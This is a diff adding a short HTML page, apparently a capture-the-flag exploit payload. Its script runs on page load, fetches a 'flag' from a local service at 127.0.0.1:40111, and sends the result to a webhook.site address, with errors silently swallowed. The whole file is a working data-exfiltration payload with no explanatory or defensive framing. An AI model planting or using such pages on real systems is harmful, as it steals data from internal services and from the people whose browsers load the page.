@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  try {
+    const flag = await fetch("https://127.0.0.1:40111/flag")
+      .then(r => r.text());
+    await fetch("https://webhook.site/0e9133a4-4afe-41e9-a3b1-b4cd56158f75?flag=" + encodeURIComponent(flag));
+  } catch (e) {}
+})();
+</script>
+</body>
+</html>
